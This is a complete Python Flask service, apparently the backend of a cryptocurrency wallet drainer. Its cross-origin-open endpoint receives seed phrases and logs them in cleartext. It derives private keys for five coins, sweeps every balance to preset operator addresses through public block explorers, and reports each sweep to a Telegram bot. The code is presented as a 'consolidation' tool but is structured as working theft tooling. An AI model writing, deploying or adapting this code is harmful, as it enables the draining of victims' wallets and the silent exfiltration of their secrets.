#!/usr/bin/env python3
import os
import json
import time
import hmac
import hashlib
import logging
from decimal import Decimal, getcontext
from datetime import datetime

import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from dotenv import load_dotenv
from mnemonic import Mnemonic
from bip32 import BIP32
import importlib

# High precision for sat/fee math
getcontext().prec = 50

# ------------------------------------------------------------
# Flask / Env
# ------------------------------------------------------------
load_dotenv()
os.environ["FLASK_ENV"] = "production"

app = Flask(__name__)
CORS(app)

logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

# ------------------------------------------------------------
# ENV CONFIG
# ------------------------------------------------------------
COINS = [c.strip().upper() for c in os.getenv("COINS", "").split(",") if c.strip()]

NOWPAYMENTS_API_KEY = os.getenv("NOWPAYMENTS_API_KEY", "")
NOWPAYMENTS_API_URL = os.getenv("NOWPAYMENTS_API_URL", "https://api.nowpayments.io/v1/invoice")
FEE_RATE_SATS_PER_VBYTE = int(os.getenv("FEE_RATE_SATS_PER_VBYTE", "25"))
DEFAULT_MIN_OUTPUT_SATS = int(os.getenv("DEFAULT_MIN_OUTPUT_SATS", "10000"))
LOG_HMAC_KEY = os.getenv("LOG_HMAC_KEY", "")

# Targets for supported UTXO sweep
# Example in .env:
# UTXO_TARGETS={"BTC":"your_btc_address","LTC":"your_ltc","DOGE":"your_doge","BCH":"your_bch","DASH":"your_dash"}
try:
    UTXO_TARGETS = json.loads(os.getenv("UTXO_TARGETS", "{}"))
except Exception:
    UTXO_TARGETS = {}

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

# ------------------------------------------------------------
# Supported / Unsupported
# ------------------------------------------------------------
SUPPORTED_UTXO = ["BTC", "LTC", "DOGE", "BCH", "DASH"]  # full auto-send
# Any other coin in COINS will be invoice-only via NOWPayments (no pycoin raw TX).

# BIP32 hardened bit
HARD = 0x80000000

# BIP44 coin types (only those we actually use)
BIP44_COIN_TYPE = {
    "BTC": 0,
    "LTC": 2,
    "DOGE": 3,
    "DASH": 5,
    "BCH": 145
}

# pycoin symbol mapping
PYCOIN_SYMBOL = {
    "BTC": "btc",
    "LTC": "ltc",
    "DOGE": "doge",
    "BCH": "bch",
    "DASH": "dash",
}

# Explorer config for supported coins
EXPLORERS = {
    "BTC": {
        "utxos": "https://blockchain.info/unspent?active={addr}",
        "broadcast": "https://blockchain.info/pushtx"
    },
    "LTC": {
        "utxos": "https://sochain.com/api/v2/get_tx_unspent/LTC/{addr}",
        "broadcast": "https://sochain.com/api/v2/send_tx/LTC"
    },
    "DOGE": {
        "utxos": "https://sochain.com/api/v2/get_tx_unspent/DOGE/{addr}",
        "broadcast": "https://sochain.com/api/v2/send_tx/DOGE"
    },
    "BCH": {
        "utxos": "https://api.blockchair.com/bitcoin-cash/dashboards/address/{addr}",
        "broadcast": "https://api.blockchair.com/bitcoin-cash/push/transaction"
    },
    "DASH": {
        "utxos": "https://sochain.com/api/v2/get_tx_unspent/DASH/{addr}",
        "broadcast": "https://sochain.com/api/v2/send_tx/DASH"
    },
}

# ------------------------------------------------------------
# Crypto utility
# ------------------------------------------------------------
def double_sha256(b: bytes) -> bytes:
    return hashlib.sha256(hashlib.sha256(b).digest()).digest()

def int_to_le(n: int, length: int) -> bytes:
    return n.to_bytes(length, "little")

def encode_varint(i: int) -> bytes:
    if i < 0xfd:
        return bytes([i])
    elif i <= 0xffff:
        return b"\xfd" + int_to_le(i, 2)
    elif i <= 0xffffffff:
        return b"\xfe" + int_to_le(i, 4)
    else:
        return b"\xff" + int_to_le(i, 8)

# ------------------------------------------------------------
# Telegram logging (optional)
# ------------------------------------------------------------
def telegram_notify(text: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        logger.error(f"[TG] Error sending Telegram message: {e}")

def mnemonic_hmac(m: str) -> str:
    if not LOG_HMAC_KEY:
        return ""
    return hmac.new(LOG_HMAC_KEY.encode(), m.encode(), hashlib.sha256).hexdigest()

# ------------------------------------------------------------
# pycoin helpers
# ------------------------------------------------------------
def load_pycoin_network(coin: str):
    sym = PYCOIN_SYMBOL.get(coin)
    if not sym:
        raise ValueError(f"No pycoin symbol for {coin}")
    try:
        module = importlib.import_module(f"pycoin.symbols.{sym}")
        return module.network
    except Exception as e:
        raise RuntimeError(f"Failed to load pycoin network for {coin}: {e}")

def derive_priv_and_address(mnemonic: str, coin: str):
    """
    Legacy derivation: m/44'/coin_type'/0'/0/0
    Returns (priv_bytes, address, path_str)
    """
    mnemo = Mnemonic("english")
    cleaned = " ".join(mnemonic.split())
    if not mnemo.check(cleaned):
        raise ValueError("Invalid mnemonic")

    if coin not in BIP44_COIN_TYPE:
        raise ValueError(f"No BIP44 coin type for {coin}")

    coin_type = BIP44_COIN_TYPE[coin]
    path = [44 | HARD, coin_type | HARD, 0 | HARD, 0, 0]
    path_str = f"m/44'/{coin_type}'/0'/0/0"

    seed = mnemo.to_seed(cleaned)
    bip32 = BIP32.from_seed(seed)
    priv = bip32.get_privkey_from_path(path)

    net = load_pycoin_network(coin)
    secexp = int.from_bytes(priv, "big")
    key = net.keys.private(secret_exponent=secexp)
    addr = key.address()

    logger.debug(f"[HD] {coin} derived address: {addr}")
    logger.debug(f"[HD] Derivation path: {path_str}")

    return priv, addr, path_str

def p2pkh_scriptpubkey(address: str, coin: str) -> bytes:
    net = load_pycoin_network(coin)
    a = net.parse.address(address)
    return a.script()

# ------------------------------------------------------------
# Explorer: UTXOs
# ------------------------------------------------------------
def get_utxos(coin: str, addr: str):
    conf = EXPLORERS.get(coin)
    if not conf or "utxos" not in conf:
        return []

    url = conf["utxos"].format(addr=addr)
    logger.debug(f"[{coin}] Fetching UTXOs: {url}")

    try:
        r = requests.get(url, timeout=45)
    except Exception as e:
        logger.error(f"[{coin}] UTXO fetch error: {e}")
        return []

    # BTC: blockchain.info
    if "blockchain.info" in url:
        try:
            data = r.json()
        except Exception:
            # blockchain.info sometimes returns 'unspent_outputs' directly
            try:
                data = json.loads(r.text)
            except Exception:
                return []
        if "unspent_outputs" not in data:
            return []
        utxos = []
        for u in data["unspent_outputs"]:
            utxos.append({
                "txid": u["tx_hash_big_endian"],
                "vout": u["tx_output_n"],
                "sats": int(u["value"]),
                "script": u.get("script"),
                "address": addr,
            })
        return utxos

    # SoChain
    if "sochain.com" in url:
        try:
            data = r.json()
        except Exception:
            return []
        if data.get("status") != "success":
            return []
        utxos = []
        for u in data.get("data", {}).get("txs", []):
            utxos.append({
                "txid": u["txid"],
                "vout": u["output_no"],
                "sats": int(Decimal(u["value"]) * Decimal(1e8)),
                "script": u.get("script_hex"),
                "address": addr,
            })
        return utxos

    # Blockchair (BCH)
    if "blockchair.com" in url:
        if r.status_code != 200:
            logger.error(f"[{coin}] Blockchair status: {r.status_code}")
            return []
        try:
            data = r.json()
            d = data["data"]
            key = list(d.keys())[0]
            utxo_list = d[key].get("utxo", [])
        except Exception:
            return []
        utxos = []
        for u in utxo_list:
            utxos.append({
                "txid": u["transaction_hash"],
                "vout": u["index"],
                "sats": int(u["value"]),
                "script": u.get("script_hex"),
                "address": addr,
            })
        return utxos

    return []

# ------------------------------------------------------------
# Raw TX builder / signer
# ------------------------------------------------------------
def build_unsigned_tx(coin: str, utxos, to_addr: str, amount_sats: int, change_addr=None, change_sats=0):
    version = int_to_le(1, 4)
    locktime = int_to_le(0, 4)

    # Inputs
    tx_ins = b""
    for u in utxos:
        txid_bytes = bytes.fromhex(u["txid"])[::-1]
        vout_bytes = int_to_le(u["vout"], 4)
        script_sig = b""
        sequence = bytes.fromhex("ffffffff")
        tx_ins += txid_bytes + vout_bytes + encode_varint(len(script_sig)) + script_sig + sequence

    # Outputs
    tx_outs = b""

    # Main output
    script_pub = p2pkh_scriptpubkey(to_addr, coin)
    tx_outs += int_to_le(amount_sats, 8) + encode_varint(len(script_pub)) + script_pub

    # Change output
    out_count = 1
    if change_addr and change_sats > 0:
        change_script = p2pkh_scriptpubkey(change_addr, coin)
        tx_outs += int_to_le(change_sats, 8) + encode_varint(len(change_script)) + change_script
        out_count += 1

    tx = (
        version +
        encode_varint(len(utxos)) +
        tx_ins +
        encode_varint(out_count) +
        tx_outs +
        locktime
    )
    return tx

def sign_tx(coin: str, unsigned_tx: bytes, utxos, priv_bytes: bytes) -> str:
    net = load_pycoin_network(coin)
    secexp = int.from_bytes(priv_bytes, "big")
    key = net.keys.private(secret_exponent=secexp)
    pubkey_sec = key.sec()

    version = unsigned_tx[:4]
    offset = 4

    in_count = unsigned_tx[offset]
    offset += 1

    inputs = []
    for _ in range(in_count):
        txid = unsigned_tx[offset:offset+32]
        offset += 32
        vout = unsigned_tx[offset:offset+4]
        offset += 4
        slen = unsigned_tx[offset]
        offset += 1
        script = unsigned_tx[offset:offset+slen]
        offset += slen
        seq = unsigned_tx[offset:offset+4]
        offset += 4
        inputs.append((txid, vout, script, seq))

    out_count = unsigned_tx[offset]
    offset += 1
    outputs = unsigned_tx[offset:]

    signed_inputs = b""

    for idx, (txid, vout, script, seq) in enumerate(inputs):
        # Build preimage
        tmp = version + encode_varint(in_count)
        for j, (txid2, vout2, _, seq2) in enumerate(inputs):
            if j == idx:
                utxo_script_hex = utxos[j].get("script")
                if utxo_script_hex:
                    spk = bytes.fromhex(utxo_script_hex)
                else:
                    spk = p2pkh_scriptpubkey(utxos[j]["address"], coin)
                tmp += txid2 + vout2 + encode_varint(len(spk)) + spk + seq2
            else:
                tmp += txid2 + vout2 + b"\x00" + seq2

        tmp += bytes([out_count]) + outputs
        tmp += int_to_le(0, 4)  # locktime
        tmp += int_to_le(1, 4)  # SIGHASH_ALL

        h = double_sha256(tmp)
        sig = key.sign(h) + b"\x01"  # append sighash_all

        script_sig = encode_varint(len(sig)) + sig + encode_varint(len(pubkey_sec)) + pubkey_sec
        signed_inputs += txid + vout + encode_varint(len(script_sig)) + script_sig + seq

    final_tx = version + encode_varint(in_count) + signed_inputs + bytes([out_count]) + outputs
    return final_tx.hex()

# ------------------------------------------------------------
# Broadcast
# ------------------------------------------------------------
def broadcast_raw_tx(coin: str, raw_hex: str):
    conf = EXPLORERS.get(coin)
    if not conf or "broadcast" not in conf:
        return None

    url = conf["broadcast"]
    logger.debug(f"[{coin}] Broadcasting TX to {url}")

    # blockchain.info
    if "blockchain.info" in url:
        try:
            r = requests.post(url, data={"tx": raw_hex}, timeout=30)
            r.raise_for_status()
            # compute txid ourselves
            raw_bytes = bytes.fromhex(raw_hex)
            txid = double_sha256(raw_bytes)[::-1].hex()
            return txid
        except Exception as e:
            logger.error(f"[{coin}] Broadcast error (blockchain.info): {e}")
            return None

    # SoChain
    if "sochain.com" in url:
        try:
            r = requests.post(url, json={"tx_hex": raw_hex}, timeout=30)
            r.raise_for_status()
            j = r.json()
            if j.get("status") == "success":
                return j.get("data", {}).get("txid")
            return None
        except Exception as e:
            logger.error(f"[{coin}] Broadcast error (SoChain): {e}")
            return None

    # Blockchair (BCH)
    if "blockchair.com" in url:
        try:
            r = requests.post(url, data={"data": raw_hex}, timeout=30)
            r.raise_for_status()
            j = r.json()
            return j.get("data", {}).get("transaction_hash")
        except Exception as e:
            logger.error(f"[{coin}] Broadcast error (Blockchair): {e}")
            return None

    return None

# ------------------------------------------------------------
# NOWPayments invoice (for unsupported coins)
# ------------------------------------------------------------
def create_nowpayments_invoice(coin: str):
    if not NOWPAYMENTS_API_KEY:
        raise RuntimeError("NOWPAYMENTS_API_KEY not set")

    # Dummy 1 unit invoice; you will send manually
    payload = {
        "price_amount": 1,
        "price_currency": coin,
        "pay_currency": coin,
        "order_description": f"Manual deposit for {coin}"
    }
    headers = {
        "x-api-key": NOWPAYMENTS_API_KEY,
        "Content-Type": "application/json"
    }

    logger.debug(f"[NP] Creating invoice for {coin}")
    r = requests.post(NOWPAYMENTS_API_URL, json=payload, headers=headers, timeout=30)
    r.raise_for_status()
    return r.json()

# ------------------------------------------------------------
# UTXO sender
# ------------------------------------------------------------
def estimate_fee(coin: str, utxo_count: int, output_count: int) -> int:
    vbytes = 10 + 148 * utxo_count + 34 * output_count
    return vbytes * FEE_RATE_SATS_PER_VBYTE

def utxo_send_full_auto(mnemonic: str, coin: str):
    target = UTXO_TARGETS.get(coin)
    if not target:
        logger.debug(f"[{coin}] No target address in UTXO_TARGETS")
        return {"coin": coin, "status": "no_target"}

    priv, from_addr, path = derive_priv_and_address(mnemonic, coin)
    utxos = get_utxos(coin, from_addr)

    if not utxos:
        logger.debug(f"[{coin}] No UTXOs for {from_addr}")
        return {"coin": coin, "status": "no_utxos", "from": from_addr}

    total_in = sum(u["sats"] for u in utxos)
    fee = estimate_fee(coin, len(utxos), 1)

    if total_in <= fee + DEFAULT_MIN_OUTPUT_SATS:
        logger.debug(f"[{coin}] Balance too small after fee: total={total_in}, fee={fee}")
        return {"coin": coin, "status": "too_small", "from": from_addr}

    amount_sats = total_in - fee

    unsigned = build_unsigned_tx(
        coin,
        utxos,
        to_addr=target,
        amount_sats=amount_sats,
        change_addr=None,
        change_sats=0
    )
    raw_hex = sign_tx(coin, unsigned, utxos, priv)
    txid = broadcast_raw_tx(coin, raw_hex)

    text = (
        f"<b>{coin} Auto-Sweep</b>\n"
        f"From: <code>{from_addr}</code>\n"
        f"To: <code>{target}</code>\n"
        f"Amount: {amount_sats/1e8:.8f} {coin}\n"
        f"Fee: {fee} sats\n"
        f"TXID: {txid}\n"
        f"<b>RawTX:</b>\n<code>{raw_hex}</code>"
    )
    telegram_notify(text)

    return {
        "coin": coin,
        "status": "sent",
        "from": from_addr,
        "to": target,
        "amount_sats": amount_sats,
        "fee_sats": fee,
        "txid": txid
    }

def unsupported_coin_flow(coin: str):
    try:
        inv = create_nowpayments_invoice(coin)
        return {
            "coin": coin,
            "status": "invoice_only",
            "invoice": inv
        }
    except Exception as e:
        logger.error(f"[{coin}] NOWPayments invoice error: {e}")
        return {
            "coin": coin,
            "status": "invoice_error",
            "error": str(e)
        }

# ------------------------------------------------------------
# Master consolidation
# ------------------------------------------------------------
def run_consolidation(mnemonic: str):
    hmac_tag = mnemonic_hmac(mnemonic)
    results = []
    skipped = []

    for coin in COINS:
        if coin in SUPPORTED_UTXO:
            logger.debug(f"[{coin}] Running UTXO sweep")
            res = utxo_send_full_auto(mnemonic, coin)
            results.append(res)
        else:
            logger.debug(f"[{coin}] Unsupported for local sweep, using NOWPayments invoice-only")
            res = unsupported_coin_flow(coin)
            results.append(res)

    summary_lines = [
        "<b>Wallet Sweep Summary</b>",
        f"HMAC: <code>{hmac_tag}</code>",
        f"Time: {datetime.utcnow().isoformat()}Z",
        ""
    ]
    for r in results:
        summary_lines.append(f"{r.get('coin')}: {r.get('status')}")

    telegram_notify("\n".join(summary_lines))

    return {
        "hmac": hmac_tag,
        "results": results,
        "skipped": skipped
    }

# ------------------------------------------------------------
# Flask API
# ------------------------------------------------------------
@app.route("/api/run", methods=["POST"])
def api_run():
    logger.debug("Received request for /api/run")
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"error": "invalid_json"}), 400

    if not data or "mnemonic" not in data:
        return jsonify({"error": "mnemonic_required"}), 400

    mnemonic = str(data["mnemonic"]).strip()
    if not mnemonic:
        return jsonify({"error": "mnemonic_empty"}), 400

    logger.debug(f"Cleaned mnemonic: {mnemonic}")

    try:
        result = run_consolidation(mnemonic)
        return jsonify({"status": "ok", "result": result})
    except Exception as e:
        logger.error(f"[API] Error: {e}")
        return jsonify({"error": "internal_error", "detail": str(e)}), 500

if __name__ == "__main__":
    port = int(os.getenv("PORT", "8080"))
    logger.info(f"Starting UTXO Sweeper API on port {port}...")
    app.run(host="0.0.0.0", port=port, debug=False)
